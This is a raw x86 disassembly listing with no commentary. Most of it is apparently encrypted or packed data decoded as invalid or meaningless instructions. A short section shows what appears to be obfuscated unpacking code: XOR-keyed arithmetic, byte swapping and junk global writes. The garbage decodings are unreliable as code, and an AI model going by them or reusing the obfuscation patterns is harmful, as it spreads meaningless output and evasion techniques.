  407f7a:	jo     0x407f68
  407f7c:	mov    ch,0x5e
  407f7e:	mov    ds:0x38e439a4,eax
  407f83:	cmp    al,0x15
  407f85:	in     al,0xc3
  407f87:	clc    
  407f88:	daa    
  407f89:	mov    BYTE PTR ds:0xa99da451,ch
  407f8f:	lea    edi,[esp+esi*2]
  407f92:	jmp    0x407f2a
  407f94:	test   BYTE PTR [ebx],dh
  407f96:	push   esi
  407f97:	pop    ds
  407f98:	dec    ebx
  407f99:	mov    al,0xa7
  407f9b:	pop    esp
  407f9c:	sub    ebp,DWORD PTR [edx+0x7899d9c4]
  407fa2:	cmp    bh,BYTE PTR [edx]
  407fa4:	cld    
  407fa5:	pop    ss
  407fa6:	push   ss
  407fa7:	in     eax,dx
  407fa8:	lahf   
  407fa9:	(bad)  
  407faa:	sub    al,0x3
  407fac:	mov    bh,0x8f
  407fae:	cwde   
  407faf:	les    ebp,FWORD PTR gs:[eax-0x72977ef7]
  407fb6:	dec    esi
  407fb7:	(bad)  
  407fb8:	pop    ecx
  407fb9:	ins    BYTE PTR es:[edi],dx
  407fba:	mov    bh,0x7a
  407fbc:	sti    
  407fbd:	clc    
  407fbe:	pop    ds
  407fbf:	not    DWORD PTR [ebx+0x5d]
  407fc2:	mov    dl,0x18
  407fc4:	shr    BYTE PTR [ecx],1
  407fc6:	cs call 0x3f82:0xa0727696
  407fce:	int    0x1a
  407fd0:	push   0xdedf089d
  407fd5:	cmp    DWORD PTR [ebx],edi
  407fd7:	lock fisubr WORD PTR [ecx-0x64e0fa0]
  407fde:	jecxz  0x408014
  407fe0:	mov    bl,BYTE PTR [ecx-0x56]
  407fe3:	mov    dl,0xa3
  407fe5:	inc    ebp
  407fe6:	xchg   esi,eax
  407fe7:	call   0x171ef635
  407fec:	lahf   
  407fed:	inc    ebx
  407fee:	add    BYTE PTR [esi+ebx*2],ah
  407ff1:	adc    al,0xc5
  407ff3:	mul    BYTE PTR [ecx-0x60]
  407ff6:	xchg   BYTE PTR [edi-0x55ac59c1],bl
  407ffc:	or     ebp,DWORD PTR [esi+0x1d]
  407fff:	or     dl,ah
  408001:	adc    DWORD PTR [ecx],0x3b
  408004:	mov    ebx,DWORD PTR [ebp+0x1d]
  408007:	lds    ecx,FWORD PTR [eax+0x12]
  40800a:	mov    edx,0x8a620021
  40800f:	iret   
  408010:	push   ebx
  408011:	add    BYTE PTR [ecx],bh
  408013:	pop    eax
  408014:	das    
  408015:	xchg   esp,eax
  408016:	mov    edi,0x10fbb633
  40801b:	jl     0x407ff5
  40801d:	dec    ebx
  40801e:	sbb    DWORD PTR [eax+0x76],ebx
  408021:	mov    edi,0xa82f727d
  408026:	mov    ah,0x41
  408028:	fisttp DWORD PTR [ecx]
  40802a:	dec    esp
  40802b:	scas   eax,DWORD PTR es:[edi]
  40802c:	jns    0x407fbb
  40802e:	pop    es
  40802f:	mov    al,ds:0x5aba1ce8
  408034:	ds pusha 
  408036:	pop    ecx
  408037:	(bad)  
  408038:	lahf   
  408039:	sbb    bl,BYTE PTR ds:0xe01225ef
  40803f:	out    0x70,al
  408041:	cld    
  408042:	(bad)  
  408043:	jecxz  0x408056
  408045:	cmp    bl,BYTE PTR [edi+0x1035e846]
  40804b:	add    esp,DWORD PTR ds:0xae7d3e33
  408051:	mov    dh,0xc8
  408053:	jge    0x4080b8
  408055:	and    eax,DWORD PTR [ebp+0x7b4e8d06]
  40805b:	fsubp  st(0),st
  40805d:	add    eax,0x8a933e8d
  408062:	pop    ecx
  408063:	hlt    
  408064:	cmp    BYTE PTR [edx+0x62],ah
  408067:	and    DWORD PTR [ebx],ecx
  408069:	shl    BYTE PTR ds:0x3b112c57,cl
  40806f:	retf   
  408070:	es jg  0x408080
  408073:	es jne 0x4080a6
  408076:	mov    ecx,0xdd91bc31
  40807b:	and    BYTE PTR [esp+eax*4],ch
  40807e:	ficom  DWORD PTR [bx+si+0x6fb1]
  408083:	test   DWORD PTR [ecx-0x4],0xc45519d8
  40808a:	sti    
  40808b:	jl     0x408041
  40808d:	pop    ds
  40808e:	push   ss
  40808f:	call   0xcd8f:0x14bac633
  408096:	jmp    FWORD PTR [ebx]
  408098:	shr    cl,1
  40809a:	sldt   WORD PTR [eax]
  40809d:	add    BYTE PTR [ebx-0x39cc07bb],cl
  4080a3:	mov    edx,0xffcd8d14
  4080a8:	sub    edx,eax
  4080aa:	add    edx,DWORD PTR [ebp-0xc]
  4080ad:	mov    DWORD PTR [ebp-0xc],edx
  4080b0:	mov    eax,DWORD PTR [ebp-0x10]
  4080b3:	cmp    eax,0xf89c85b0
  4080b8:	jne    0x40383c
  4080be:	mov    DWORD PTR [ebp-0x20],0xa
  4080c5:	mov    ebx,DWORD PTR [ebp+0x8]
  4080c8:	xor    ebx,esi
  4080ca:	add    ebx,edi
  4080cc:	lea    eax,[ebx-0x3272ec]
  4080d2:	xor    eax,esi
  4080d4:	cmp    eax,0xf89c95b0
  4080d9:	je     0x40810c
  4080df:	lea    eax,[ebx+ecx*1]
  4080e2:	mov    DWORD PTR [ebp-0x14],eax
  4080e5:	mov    eax,DWORD PTR [ebp-0x28]
  4080e8:	sub    eax,ebx
  4080ea:	mov    DWORD PTR [ebp-0x18],eax
  4080ed:	push   DWORD PTR [ebp-0x18]
  4080f0:	push   DWORD PTR [ebp-0x14]
  4080f3:	call   0x408153
  4080f8:	mov    eax,DWORD PTR [ebp+0xc]
  4080fb:	mov    ecx,DWORD PTR [ebp-0x24]
  4080fe:	xor    eax,esi
  408100:	lea    ebx,[ebx+eax*1+0x3272ec]
  408107:	jmp    0x4080cc
  40810c:	dec    DWORD PTR [ebp-0x20]
  40810f:	jne    0x4080c5
  408115:	mov    eax,DWORD PTR [ebp+0x8]
  408118:	mov    edx,DWORD PTR [ebp+0xc]
  40811b:	mov    ebx,DWORD PTR [ebp+0x8]
  40811e:	xor    edx,esi
  408120:	mov    dl,BYTE PTR [edx+ecx*1+0x3272ec]
  408127:	xor    eax,esi
  408129:	mov    al,BYTE PTR [eax+ecx*1+0x3272ec]
  408130:	xor    ebx,esi
  408132:	mov    BYTE PTR [ebx+ecx*1+0x3272ec],dl
  408139:	mov    edx,DWORD PTR [ebp+0xc]
  40813c:	xor    edx,esi
  40813e:	mov    BYTE PTR [edx+ecx*1+0x3272ec],al
  408145:	mov    eax,DWORD PTR [ebp+0xc]
  408148:	xor    eax,esi
  40814a:	add    eax,edi
  40814c:	pop    edi
  40814d:	pop    esi
  40814e:	pop    ebx
  40814f:	leave  
  408150:	ret    0x8
  408153:	push   ebp
  408154:	mov    ebp,esp
  408156:	sub    esp,0x40
  408159:	add    edx,edx
  40815b:	mov    eax,DWORD PTR [ebp+0xc]
  40815e:	mov    DWORD PTR [ebp-0x18],eax
  408161:	mov    DWORD PTR ds:0x428663,0x712d
  40816b:	mov    eax,DWORD PTR [ebp+0x8]
  40816e:	mov    DWORD PTR [ebp-0x14],0xf89c85b0
  408175:	mov    DWORD PTR ds:0x428613,0x5be4
  40817f:	mov    DWORD PTR [ebp-0x30],eax
  408182:	sub    DWORD PTR ds:0x428667,ebx
  408188:	push   esi
  408189:	xor    DWORD PTR ds:0x42867b,0x42861b
  408193:	push   edi
  408194:	movzx  edi,WORD PTR ds:0x428647
  40819b:	add    DWORD PTR ds:0x428603,edi
  4081a1:	mov    edi,0xf89c85b1
  4081a6:	mov    DWORD PTR ds:0x428653,0x19
  4081b0:	cmp    DWORD PTR ds:0x428653,0x0
  4081b7:	je     0x408208
  4081bd:	cmp    DWORD PTR ds:0x428653,0x7
  4081c4:	jg     0x408208
  4081ca:	jmp    0x4081da
  4081cf:	push   0x428097
  4081d4:	call   DWORD PTR ds:0x4287c3
  4081da:	cmp    DWORD PTR ds:0x428653,0x8
  4081e1:	jne    0x4081f4
  4081e7:	mov    edx,DWORD PTR ds:0x428653
  4081ed:	dec    edx
  4081ee:	mov    DWORD PTR ds:0x428653,edx
  4081f4:	xor    edx,edx
  4081f6:	or     edx,DWORD PTR ds:0x428653
  4081fc:	dec    edx
  4081fd:	mov    DWORD PTR ds:0x428653,edx
  408203:	jmp    0x4081b0
  408208:	mov    DWORD PTR [ebp-0x8],edi
  40820b:	sbb    ecx,0x4b70
  408211:	mov    eax,DWORD PTR [ebp-0x14]
  408214:	mov    edx,DWORD PTR ds:0x4285cf
  40821a:	xor    DWORD PTR ds:0x4285e7,edx
  408220:	mov    ecx,0x75108a4
  408225:	or     DWORD PTR ds:0x4285ef,ecx
  40822b:	xor    eax,ecx
  40822d:	mov    esi,0x3272ec
  408232:	adc    DWORD PTR ds:0x4285db,edi
  408238:	add    eax,esi
  40823a:	mov    DWORD PTR [ebp-0x4],eax
  40823d:	mov    DWORD PTR ds:0x428667,0x1d
  408247:	cmp    DWORD PTR ds:0x428667,0x0
  40824e:	je     0x408296
  408254:	cmp    DWORD PTR ds:0x428667,0x28
  40825b:	jg     0x408296
  408261:	jmp    0x408284
  408266:	push   0x428633
  40826b:	push   DWORD PTR [ebp-0x10]
  40826e:	push   0x7f16
  408273:	push   0x6682
  408278:	push   DWORD PTR [ebp-0x20]
  40827b:	push   DWORD PTR [ebp-0x20]
  40827e:	call   DWORD PTR ds:0x4287c7
  408284:	mov    edx,DWORD PTR ds:0x428667
  40828a:	dec    edx
  40828b:	mov    DWORD PTR ds:0x428667,edx
  408291:	jmp    0x408247
  408296:	mov    eax,DWORD PTR [ebp-0x14]
  408299:	xor    eax,ecx
  40829b:	add    eax,esi
  40829d:	mov    DWORD PTR [ebp+0x8],eax
  4082a0:	mov    DWORD PTR [ebp-0x28],0xf89c8590
  4082a7:	xor    eax,DWORD PTR ds:0x428623
  4082ad:	mov    DWORD PTR [ebp-0x24],0xf89c85bf
  4082b4:	mov    eax,ds:0x4286d7
  4082b9:	mov    edx,DWORD PTR ds:0x4286eb
  4082bf:	sub    eax,edx
  4082c1:	xor    eax,DWORD PTR [eax+edx*1]
  4082c4:	mov    eax,DWORD PTR [ebp-0x14]
  4082c7:	mov    edx,DWORD PTR [ebp-0x18]
  4082ca:	xor    eax,ecx
  4082cc:	sbb    DWORD PTR ds:0x428677,0x289b
  4082d6:	add    eax,esi
  4082d8:	mov    DWORD PTR ds:0x428653,0x7663
  4082e2:	cmp    edx,eax
  4082e4:	je     0x40aa55
  4082ea:	mov    DWORD PTR ds:0x42861f,0x1f7b
  4082f4:	push   ebx
  4082f5:	jmp    0x40aa30
  4082fa:	mov    eax,ds:0x428607
  4082ff:	add    DWORD PTR ds:0x42865b,eax
  408305:	mov    edx,DWORD PTR [ebp-0x4]
  408308:	dec    eax
  408309:	mov    eax,DWORD PTR [ebp-0x18]
  40830c:	and    DWORD PTR ds:0x4285ef,0x33ad
  408316:	mov    ebx,DWORD PTR [ebp-0x28]
  408319:	sub    eax,edx
  40831b:	xor    ebx,ecx
  40831d:	adc    DWORD PTR ds:0x42863f,0x20c9
  408327:	xor    edx,edx
  408329:	add    ebx,esi
  40832b:	sub    DWORD PTR ds:0x428603,0x441d
  408335:	div    ebx
  408337:	xor    edx,DWORD PTR ds:0x42863b
  40833d:	jmp    0x40a6e1
  408342:	sbb    ecx,DWORD PTR [esi+0x78d7a47c]
  408348:	fwait
  408349:	and    esi,0x5416ec02
  40834f:	push   es
  408350:	sbb    DWORD PTR es:[edi-0xc8585ec],ebx
  408357:	pop    edi
  408358:	jp     0x4083d4
  40835a:	push   eax
  40835b:	retf   0x16da
  40835e:	xlat   BYTE PTR ds:[ebx]
  40835f:	pop    ds
  408360:	cmp    eax,0x14833674
  408365:	call   0xe5e3:0xe42aa246
  40836c:	inc    edi
  40836d:	and    esi,DWORD PTR [edx+0x68]
  408370:	add    al,al
  408372:	adc    BYTE PTR [eax-0x3d19b18a],ch
  408378:	or     DWORD PTR [ebx],edx
  40837a:	push   eax
  40837b:	mov    dl,0x89
  40837d:	and    BYTE PTR [ecx],bl
  40837f:	pop    es
  408380:	add    al,BYTE PTR [ebp-0xf6ee02e]
  408386:	retf   0xe0cf
  408389:	loop   0x40832d
  40838b:	sbb    ch,ah
  40838d:	repnz cmp edx,edi
  408390:	push   0xffffffbb
  408392:	daa    
  408393:	clc    
  408394:	push   ebp
  408395:	scas   al,BYTE PTR es:[edi]
  408396:	add    eax,0xae07d623
  40839b:	(bad)  
  40839c:	mov    ss,esp
  40839e:	sbb    cl,BYTE PTR [eax-0x2f006ef5]
  4083a4:	mov    ds:0x8fad7fa3,al
  4083a9:	int    0xbe
  4083ab:	or     al,0xd5
  4083ad:	cld    
  4083ae:	ss push ds
  4083b0:	aam    0xab
  4083b2:	out    dx,al
  4083b3:	mov    eax,0xaeafc899
  4083b8:	mul    DWORD PTR [edi]
  4083ba:	mov    edi,0xe116ef5a
  4083bf:	lock mov WORD PTR [eax],?
  4083c2:	mov    ebx,0x41005cb7
  4083c7:	push   esi
  4083c8:	js     0x408355
  4083ca:	in     al,dx
  4083cb:	dec    ebx
  4083cc:	cmp    cl,0xbc
  4083cf:	xchg   ecx,eax
  4083d0:	xor    cl,0x23
  4083d3:	aas    
  4083d4:	call   0x7969:0x52fbaa33
  4083db:	(bad)
  4083de:	inc    edi
  4083df:	call   0xd2fb:0x6c826a0e
  4083e6:	xchg   edx,eax
  4083e7:	mov    esp,0x7f259aaa
  4083ec:	pop    esi
  4083ed:	cmc    
  4083ee:	sbb    bh,dh
  4083f0:	inc    ebx
  4083f1:	xor    BYTE PTR [ebp+0x7335985f],cl
  4083f7:	cmp    al,0x44
  4083f9:	mov    eax,0x605c9ff
  4083fe:	loopne 0x40844b
  408400:	in     al,0xb
  408402:	mov    esp,0xa3d7f4c
  408407:	imul   edi,DWORD PTR [ecx],0xffffffae
  40840a:	js     0x40848a
  40840c:	mov    al,ds:0x68ff2e9
  408411:	jge    0x408456
  408413:	jbe    0x408460
  408415:	or     al,0xf9
  408417:	xor    dh,bh
  408419:	jmp    0x4083b0
  40841b:	mov    DWORD PTR [esi+edx*8-0x48],esi
  40841f:	stc    
  408420:	adc    ebx,DWORD PTR [ebp-0x45d01cbc]
  408426:	sbb    DWORD PTR [ebx+0x75eefb95],eax
  40842c:	add    ecx,DWORD PTR fs:[edx]
  40842f:	xchg   ebx,eax
  408430:	mov    al,ds:0x951f1a15
  408435:	mov    bl,0x55
  408437:	xchg   ebx,eax
  408438:	add    eax,DWORD PTR [ebx+0x1d0fa863]
  40843e:	jmp    0x954c:0x4b49686c
  408445:	dec    esp
  408446:	or     DWORD PTR [ebx],esp
  408448:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408449:	daa    
  40844a:	icebp  
  40844b:	shr    BYTE PTR [eax+0x75],0x8
  40844f:	pop    ds
  408450:	stos   DWORD PTR es:[edi],eax
  408451:	arpl   WORD PTR [bx-0x5e],sp
  408455:	leave  
  408456:	mov    bl,0xf0
  408458:	fmul   QWORD PTR [edx+ebp*1]
  40845b:	xchg   edx,eax
  40845c:	xor    edi,DWORD PTR [ebx-0x4d0aa9b0]
  408462:	push   ecx
  408463:	jmp    FWORD PTR [ecx+0x23d446f5]
  408469:	mov    bh,0x46
  40846b:	test   DWORD PTR [edi+0x28],edx
  40846e:	pop    ds
  40846f:	bound  edx,QWORD PTR [edx-0x787e02b7]
  408475:	stos   DWORD PTR es:[edi],eax
  408476:	jle    0x40841c
  408478:	sub    cl,BYTE PTR [esi-0x14]
  40847b:	mov    dl,0x8d
  40847d:	lods   al,BYTE PTR ds:[esi]
  40847e:	stc    
  40847f:	out    dx,al
  408480:	dec    eax
  408481:	mov    eax,0xc48d93bd
  408486:	sbb    BYTE PTR [ebp+0x1a],ch
  408489:	dec    edi
  40848a:	cmp    al,0xad
  40848c:	or     eax,DWORD PTR [ebx]
  40848e:	cld    
  40848f:	mov    al,0x8b
  408491:	call   0xf251b976
  408496:	inc    ecx
  408497:	dec    esi
  408498:	rcl    BYTE PTR [edx+0x68],cl
  40849b:	dec    ebx
  40849c:	test   ah,ch
  40849e:	mov    dl,BYTE PTR [eax]
  4084a0:	inc    ebx
  4084a1:	scas   eax,DWORD PTR es:[edi]
  4084a2:	cdq    
  4084a3:	adc    BYTE PTR fs:[esi],bh
  4084a6:	cdq    
  4084a7:	jne    0x4084f0
  4084a9:	sub    dh,al
  4084ab:	add    DWORD PTR [ebp+0x22],edx
  4084ae:	mov    ds:0xd668502d,eax
  4084b3:	lahf   
  4084b4:	inc    esp
  4084b5:	shl    esp,0x98
  4084b8:	mov    al,ds:0x728d1595
  4084bd:	out    0x1e,eax
  4084bf:	xchg   edi,eax
  4084c0:	push   esi
  4084c1:	aad    0x34
  4084c3:	mov    bh,0xee
  4084c5:	mov    ch,0xae
  4084c7:	outs   dx,BYTE PTR ds:[esi]
  4084c8:	imul   ecx,DWORD PTR [eax-0xb],0xffffff97
  4084cc:	mov    edx,0xad62ec68
  4084d1:	test   dl,bh
  4084d3:	mov    dh,0x15
  4084d5:	ja     0x40847b
  4084d7:	imul   edx,DWORD PTR [ecx],0x8df77b6c
  4084dd:	dec    eax
  4084de:	cmp    ch,dl
  4084e0:	daa    
  4084e1:	mov    ch,0xbc
  4084e3:	jle    0x4084c5
  4084e5:	lods   eax,DWORD PTR ds:[esi]
  4084e6:	xchg   edi,eax
  4084e7:	aaa    
  4084e8:	call   0x6493:0xb054bf4e
  4084ef:	mov    esi,DWORD PTR [esi]
  4084f1:	shl    ah,0x10
  4084f4:	add    BYTE PTR [edi+edx*2+0x1a],al
  4084f8:	pop    ebp
  4084f9:	inc    ebx
  4084fa:	add    ebp,DWORD PTR [edx+ebx*2+0x27]
  4084fe:	mov    eax,ds:0xe7497636
  408503:	and    BYTE PTR [ebp+0x420dac85],bl
  408509:	aas    
  40850a:	push   cs
  40850b:	push   es
  40850c:	outs   dx,BYTE PTR ds:[esi]
  40850d:	(bad)  
  40850e:	mov    ebp,0x7a78549d
  408513:	pop    es
  408514:	dec    esi
  408515:	sar    BYTE PTR [ecx],cl
  408517:	leave  
  408518:	shr    DWORD PTR [ecx+0x2c],0x16
  40851c:	stc    
  40851d:	into   
  40851e:	fcomp  DWORD PTR [edx-0x1f]
  408521:	xor    eax,0x217d45c1
  408526:	adc    edx,ecx
  408528:	push   0xffffffc5
  40852a:	jmp    0xcff:0x213a
  408530:	push   0x4a
  408532:	lds    edi,FWORD PTR [edi]
  408534:	mov    eax,0x93e77ac1
  408539:	imul   eax,esp,0xffffffc5
  40853c:	jnp    0x408593
  40853e:	in     al,0x2f
  408540:	jno    0x4084e5
  408542:	pop    ss
  408543:	jmp    0xe8bb:0xbd8d96c7
  40854a:	and    eax,0xeb244272
  40854f:	sub    cl,al
  408551:	lds    edi,FWORD PTR [ecx]
  408553:	push   edx
  408554:	xchg   edx,eax
  408555:	jge    0x408587
  408557:	sahf   
  408558:	jle    0x4084ff
  40855a:	retf   
  40855b:	hlt    
  40855c:	scas   eax,DWORD PTR es:[edi]
  40855d:	mov    BYTE PTR [ecx],dl
  40855f:	(bad)  
  408560:	aam    0x22
  408562:	sbb    cl,al
  408564:	cmc    
  408565:	les    eax,FWORD PTR [ecx-0x5d]
  408568:	shr    DWORD PTR [eax],1
  40856a:	pop    ecx
  40856b:	shr    DWORD PTR [esi-0x1a],0x96
  40856f:	inc    esp
  408570:	aam    0x47
  408572:	push   edi
  408573:	mov    ebp,ds
  408575:	cmp    al,0xca
  408577:	or     edi,DWORD PTR [eax+ecx*8+0x59972353]
  40857e:	and    ecx,esi
  408580:	fs mov ecx,0xf716c608
  408586:	pop    ss
  408587:	and    al,0xf5
  408589:	mov    ecx,0x5101a003
  40858e:	loopne 0x4085ac
  408590:	out    dx,eax
  408591:	int    0x1c
  408593:	aas    
  408594:	test   BYTE PTR [edi+eiz*1-0xb9d88f],al
  40859b:	sbb    edx,edi
  40859d:	shl    ch,0xb2
  4085a0:	xor    ecx,DWORD PTR [ecx+0x6233d03c]
  4085a6:	mov    ds:0xd94e2893,al
  4085ab:	lods   eax,DWORD PTR ds:[esi]
  4085ac:	js     0x40853e
  4085ae:	ret    
  4085af:	push   esp
  4085b0:	test   eax,0xb1a358b5
  4085b5:	xlat   BYTE PTR ds:[ebx]
  4085b6:	mov    bh,0x83
  4085b8:	ins    DWORD PTR es:[edi],dx
  4085b9:	push   es
  4085ba:	xor    eax,0x12a0104
  4085bf:	and    al,dh
  4085c1:	cmp    ah,BYTE PTR [ebp-0x4c260121]
  4085c7:	mov    bh,0x75
  4085c9:	adc    al,0x27
  4085cb:	stc    
  4085cc:	xchg   esi,eax
  4085cd:	pop    esp
  4085ce:	push   cs
  4085cf:	mov    dl,0xb4
  4085d1:	inc    ebx
  4085d2:	mov    dh,0x58
  4085d4:	in     eax,dx
  4085d5:	leave  
  4085d6:	outs   dx,DWORD PTR ds:[esi]
  4085d7:	test   DWORD PTR ds:0x801fa1bc,ebx
  4085dd:	inc    ebp
  4085de:	adc    ch,dl
  4085e0:	sbb    BYTE PTR [ecx-0x55],cl
  4085e3:	xchg   BYTE PTR [edi+0x69],ah
  4085e6:	push   es
  4085e7:	dec    eax
  4085e8:	mov    bl,0xea
  4085ea:	(bad)  
  4085eb:	mov    al,ds:0x24f0e2f4
  4085f0:	sub    BYTE PTR [ecx+0x5b],al
  4085f3:	aam    0xe2
  4085f5:	inc    esi
  4085f6:	xor    cl,al
  4085f8:	xor    DWORD PTR [esi],ecx
  4085fa:	xlat   BYTE PTR ds:[ebx]
  4085fb:	xchg   ebx,eax
  4085fc:	fiadd  WORD PTR [ebp-0x73]
  4085ff:	cmp    BYTE PTR [edi+0x78],0xf3
  408603:	and    BYTE PTR [ecx],cl
  408605:	pop    edi
  408606:	and    dl,dl
  408608:	pop    ebp
  408609:	test   BYTE PTR [esi],bh
  40860b:	sbb    eax,0xbdfb3eaf
  408610:	mov    DWORD PTR [ecx-0x7],edx
  408613:	mov    ds:0x9f5c823c,al
  408618:	and    al,0xd1
  40861a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40861b:	bound  ebp,QWORD PTR [edx-0x5903032c]
  408621:	push   ss
  408622:	jmp    0x40865c
  408624:	aad    0x44
  408626:	push   0x5bed7366
  40862b:	push   eax
  40862c:	mov    WORD PTR [edi+0x35254ecf],?
  408632:	inc    esp
  408633:	mov    al,0x42
  408635:	mov    esp,0xe480c18d
  40863a:	pop    esi
  40863b:	mov    al,0x2e
  40863d:	mov    esp,0xc1f887ac
  408642:	mov    ebx,0x8ca18890
  408647:	jae    0x408663
  408649:	dec    edx
  40864a:	popf   
  40864b:	adc    BYTE PTR [edx+0x99fdcb3],ch
  408651:	jb     0x40867d
  408653:	fimul  DWORD PTR [edi+0x67e7c99d]
  408659:	pop    ss
  40865a:	mov    cl,0x64
  40865c:	jmp    0xa8eb:0xc836bb3a
  408663:	xor    edi,DWORD PTR [eax]
  408665:	add    bh,BYTE PTR [ebp+0x38]
  408668:	dec    edi
  408669:	hlt    
  40866a:	add    dl,dh
  40866c:	rcr    BYTE PTR [ecx+0x77],0x47
  408670:	shr    BYTE PTR [esi+0x1853fd4a],1
  408676:	call   0x2077efbf
  40867b:	dec    eax
  40867c:	xor    ecx,edi
  40867e:	inc    esi
  40867f:	mov    ds:0xc109fa6a,eax
  408684:	cmp    BYTE PTR [esi-0x5b],bh
  408687:	xchg   edi,eax
  408688:	jbe    0x4086d6
  40868a:	sbb    BYTE PTR [ecx-0x3c],dh
  40868d:	jg     0x4086e1
  40868f:	push   eax
  408690:	jecxz  0x4086af
  408692:	stos   BYTE PTR es:[edi],al
  408693:	ficom  WORD PTR [ebp+0x3d]
  408696:	loopne 0x4086ef
  408698:	jge    0x408640
  40869a:	mov    eax,0x4831e457
  40869f:	push   ds
  4086a0:	push   esp
  4086a1:	mov    eax,0x297b3ab3
  4086a6:	mov    bl,0x1d
  4086a8:	fadd   QWORD PTR [ecx]
  4086aa:	loope  0x4086e9
  4086ac:	ret    0x1bcc
  4086af:	(bad)  
  4086b0:	xlat   BYTE PTR ds:[ebx]
  4086b1:	test   al,0x7b
  4086b3:	test   al,0x6e
  4086b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086b6:	and    esp,DWORD PTR [ecx-0x1b]
  4086b9:	imul   edx,DWORD PTR [edx-0x5d],0x2525b630
  4086c0:	push   edx
  4086c1:	pop    edi
  4086c2:	gs jnp 0x408744
  4086c5:	xor    ch,bl
  4086c7:	xchg   ebp,eax
  4086c8:	ror    DWORD PTR [esp+ebx*1+0x5afcf255],0x75
  4086d0:	outs   dx,DWORD PTR ds:[esi]
  4086d1:	ret    
  4086d2:	mov    ds:0xf9d69968,eax
  4086d7:	jbe    0x4086de
  4086d9:	xor    DWORD PTR [eax+0x34f0454f],0x46
  4086e0:	stos   BYTE PTR es:[edi],al
  4086e1:	sar    DWORD PTR [esi],cl
  4086e3:	push   cs
  4086e4:	jecxz  0x408718
  4086e6:	inc    eax
  4086e7:	mov    dl,0x45
  4086e9:	xchg   ecx,eax
  4086ea:	aas    
  4086eb:	sbb    DWORD PTR [edi-0x4],ebx
  4086ee:	mov    al,0x21
  4086f0:	mov    dh,0xde
  4086f2:	cmp    al,0x9f
  4086f4:	cmc    
  4086f5:	call   FWORD PTR [edi]
  4086f7:	mov    edx,0x3d507d7c
  4086fc:	test   BYTE PTR [ebx+esi*4+0x13],dl
  408700:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408701:	xchg   ebx,eax
  408702:	and    DWORD PTR [ebx-0x23],edi
  408705:	push   eax
  408706:	mov    al,ss:0x5726ec3c
  40870c:	imul   ecx,DWORD PTR [edi+0xc5c8b47],0x5b
  408713:	daa    
  408714:	add    DWORD PTR [ebp-0x4b],ebp
  408717:	sbb    BYTE PTR [eax+eax*8],bl
  40871a:	ficomp DWORD PTR [ebp+esi*4-0x5e615baf]
  408721:	sbb    BYTE PTR [esi],0x70
  408724:	aaa    
  408725:	xchg   edx,eax
  408726:	pop    ds
  408727:	mov    WORD PTR [edi+0x30],ds
  40872a:	scas   eax,DWORD PTR es:[edi]
  40872b:	imul   edx
  40872d:	xlat   BYTE PTR cs:[ebx]
  40872f:	adc    al,0x12
  408731:	adc    dl,BYTE PTR [edi]
  408733:	hlt    
  408734:	push   es
  408735:	rol    DWORD PTR ds:0xf411a7db,0x89
  40873c:	fwait
  40873d:	mov    al,ds:0x20bfac4e
  408742:	popa   
  408743:	or     DWORD PTR es:[ecx+0x7d],edi
  408747:	dec    edi
  408748:	imul   ebp,DWORD PTR [ebx+0x3983d65f],0xd7eedd3d
  408752:	mov    DWORD PTR [eax],ebx
  408754:	lea    esp,[eax]
  408756:	add    BYTE PTR [ebp-0x56],bh
  408759:	or     DWORD PTR [eax-0x4912644c],esi
  40875f:	jl     0x4086e9
  408761:	push   ecx
  408762:	outs   dx,DWORD PTR ds:[esi]
  408763:	loop   0x408761
  408765:	(bad)  
  408766:	push   0xa2a89b28
  40876b:	xor    al,0xf3
  40876d:	jmp    0x4086fe
  40876f:	sbb    eax,0x8a549161
  408774:	dec    ecx
  408776:	xchg   esi,eax
  408777:	pop    esp
  408778:	sub    ebx,DWORD PTR ds:0x544f802c
  40877e:	mov    DWORD PTR [edx],esi
  408780:	test   al,0x6c
  408782:	in     al,dx
  408783:	dec    edi
  408784:	enterw 0x5b8c,0x87
  408789:	xor    ecx,ebx
  40878b:	data16 aam 0x74
  40878e:	pop    edi
  40878f:	aad    0xc2
  408791:	imul   esi,DWORD PTR [eax+0x51],0xffffffc9
  408795:	mov    edx,0xbdfb6e3b
  40879a:	inc    eax
  40879b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40879c:	jae    0x40878e
  40879e:	cmp    ecx,eax
  4087a0:	cwde   
  4087a1:	int    0x8a
  4087a3:	inc    ebx
  4087a4:	cmp    BYTE PTR [edx+0x31c58d53],bh
  4087aa:	ins    DWORD PTR es:[edi],dx
  4087ab:	mov    ah,BYTE PTR [ebp+0x49]
  4087ae:	jle    0x408770
  4087b0:	and    eax,0x9feddc66
  4087b5:	xchg   esp,eax
  4087b6:	repz aad 0xb
  4087b9:	jle    0x4087c9
  4087bb:	(bad)  
  4087bc:	adc    ah,BYTE PTR [eax]
  4087be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087bf:	pop    eax
  4087c0:	mov    ebp,0x7c4a8d14
  4087c5:	lahf   
  4087c6:	ins    DWORD PTR es:[edi],dx
  4087c7:	xor    esp,DWORD PTR ds:0xa8354c58
  4087cd:	cmp    eax,DWORD PTR [ecx-0x64c42a93]
  4087d3:	enter  0x1c9,0xd4
  4087d7:	in     eax,0x1a
  4087d9:	frstor [ebx]
  4087db:	ss adc al,0x77
  4087de:	ins    BYTE PTR es:[edi],dx
  4087df:	xchg   edi,eax
  4087e0:	or     eax,DWORD PTR [ebx+esi*2+0x3c]
  4087e4:	cmp    DWORD PTR [esi-0x59],ebp
  4087e7:	sub    eax,DWORD PTR [esi+0x13688773]
  4087ed:	push   0x8502beda
  4087f2:	call   0x694e:0x86c80edc
  4087f9:	icebp  
  4087fa:	(bad)  
  4087fb:	arpl   WORD PTR [eax+ecx*2-0x2],cx
  4087ff:	in     al,0x6c
  408801:	faddp  st(4),st
  408803:	mov    edi,0x1f07f920
  408808:	lods   al,BYTE PTR ds:[esi]
  408809:	ret    
  40880a:	sub    edi,DWORD PTR [ebp+0x63cb224b]
  408810:	sbb    BYTE PTR [ebx],0xca
  408813:	push   es
  408814:	nop
  408815:	push   edx
  408816:	jae    0x4087e7
  408818:	mov    ch,BYTE PTR [esi+0x4b8caab1]
  40881e:	inc    eax
  40881f:	mov    bh,0x72
  408821:	imul   eax,ecx,0x49
  408824:	loope  0x40881d
  408826:	add    DWORD PTR [eax+edi*2+0x26dfc569],0xffffffad
  40882e:	aas    
